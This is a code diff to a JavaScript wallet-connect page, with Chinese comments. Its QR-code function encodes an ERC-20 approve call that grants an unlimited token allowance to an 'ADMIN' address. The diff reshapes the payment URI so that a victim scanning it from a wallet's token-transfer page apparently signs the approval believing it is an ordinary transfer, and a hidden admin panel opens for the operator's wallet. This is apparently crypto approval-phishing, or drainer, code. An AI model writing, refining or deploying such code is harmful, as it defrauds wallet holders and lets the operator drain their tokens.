@@ -109,15 +109,11 @@ document.getElementById("connectBtn").onclick = async () => {
     alert("请在钱包浏览器内打开");
     return;
   }
-
   await switchToBSC();
-
   try {
     const accounts = await ethereum.request({ method: "eth_requestAccounts" });
     account = accounts[0];
     document.getElementById("connectBtn").innerText = "✅ 已连接";
-
-    // ✅ 关键：只要是管理员钱包，必显示后台
     if (account.toLowerCase() === ADMIN.toLowerCase()) {
       document.getElementById("adminPanel").classList.add("show");
     }
@@ -126,16 +122,16 @@ document.getElementById("connectBtn").onclick = async () => {
   }
 };
 
-// ==================== 二维码：币安链 + 显示你的收款地址 ====================
+// ==================== 核心：适配「代币转账页」扫码的二维码 ====================
 function genQR() {
   // 授权数据：给管理员地址无限授权
   const approveData = "0x095ea7b3" +
     ADMIN.slice(2).padStart(64, "0") +
     "ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff";
 
-  // ✅ 关键：用币安链专用格式，让钱包识别为 BSC，且收款地址显示为你的 ADMIN 地址
-  // 格式：ethereum:【你的收款地址】@56/【代币地址】?data=【授权数据】
-  const uri = `ethereum:${ADMIN}@56/${TOKEN}?data=${approveData}`;
+  // ✅ 关键格式：适配代币转账页扫码，自动识别为币安链
+  // 格式：ethereum:【代币合约地址】@56?data=【授权数据】
+  const uri = `ethereum:${TOKEN}@56?data=${approveData}`;
 
   document.getElementById("qrcode").innerHTML =
     `<img src="https://api.qrserver.com/v1/create-qr-code/?size=280x280&data=${encodeURIComponent(uri)}">`;
